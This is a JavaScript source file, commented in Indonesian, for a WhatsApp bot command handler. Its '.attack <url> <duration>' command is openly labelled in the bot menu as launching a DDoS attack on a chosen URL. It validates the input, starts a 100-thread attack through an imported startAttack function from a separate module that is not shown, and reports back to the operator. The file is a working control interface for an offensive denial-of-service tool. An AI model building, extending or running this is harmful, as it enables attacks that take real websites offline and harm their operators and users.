const { startAttack } = require('./attack');

/**
 * Handler untuk command WhatsApp
 * @param {object} sock - Socket connection
 * @param {string} adminNumber - Nomor admin WhatsApp
 * @param {number} connectionIndex - Index koneksi
 * @param {string} text - Teks pesan yang diterima
 */
async function handleCommand(sock, adminNumber, connectionIndex, text) {
    try {
        // Command .menu
        if (text === '.menu') {
            const menuText = `
*🤖 BOT MENU* - Connection ${connectionIndex}

*.menu* - Menampilkan menu ini
*.attack <url> <duration>* - Melakukan serangan DDoS
*.status* - Menampilkan status koneksi

_Example: .attack https://example.com 60_
            `;
            await sock.sendMessage(adminNumber + '@s.whatsapp.net', { text: menuText });
        }

        // Command .attack
        else if (text.startsWith('.attack ')) {
            const args = text.split(' ');
            if (args.length < 3) {
                await sock.sendMessage(adminNumber + '@s.whatsapp.net', { text: '❌ Usage: .attack <url> <duration>' });
                return;
            }
            
            const url = args[1];
            const duration = parseInt(args[2]);
            const threads = 100;
            const delayMs = 100;

            // Validasi URL
            if (!isValidUrl(url)) {
                await sock.sendMessage(adminNumber + '@s.whatsapp.net', { 
                    text: '❌ URL tidak valid! Pastikan URL diawali dengan http:// atau https://' 
                });
                return;
            }

            // Validasi duration
            if (isNaN(duration) || duration < 1 || duration > 3600) {
                await sock.sendMessage(adminNumber + '@s.whatsapp.net', { 
                    text: '❌ Durasi tidak valid! Gunakan angka antara 1-3600 detik' 
                });
                return;
            }

            // Kirim konfirmasi
            await sock.sendMessage(adminNumber + '@s.whatsapp.net', { 
                text: `🚀 Memulai attack ke ${url}\n⏱ Durasi: ${duration} detik\n🧵 Threads: ${threads}\n⏳ Delay: ${delayMs}ms\n\nConnection: ${connectionIndex}` 
            });

            // Jalankan attack
            startAttack(url, duration, threads, delayMs);

            // Kirim notifikasi ketika attack selesai (setelah duration)
            setTimeout(async () => {
                await sock.sendMessage(adminNumber + '@s.whatsapp.net', { 
                    text: `✅ Attack ke ${url} selesai\nConnection: ${connectionIndex}` 
                });
            }, duration * 1000);
        }

        // Command .status
        else if (text === '.status') {
            await sock.sendMessage(adminNumber + '@s.whatsapp.net', { 
                text: `✅ Connection ${connectionIndex} aktif dan berjalan\n\nGunakan .menu untuk melihat daftar perintah` 
            });
        }
    } catch (error) {
        console.error('❌ Error handling command:', error);
        await sock.sendMessage(adminNumber + '@s.whatsapp.net', { 
            text: `❌ Terjadi error: ${error.message}` 
        });
    }
}

/**
 * Validasi URL
 * @param {string} string - URL yang akan divalidasi
 * @returns {boolean} - True jika URL valid
 */
function isValidUrl(string) {
    try {
        new URL(string);
        return true;
    } catch (_) {
        return false;
    }
}

module.exports = { handleCommand };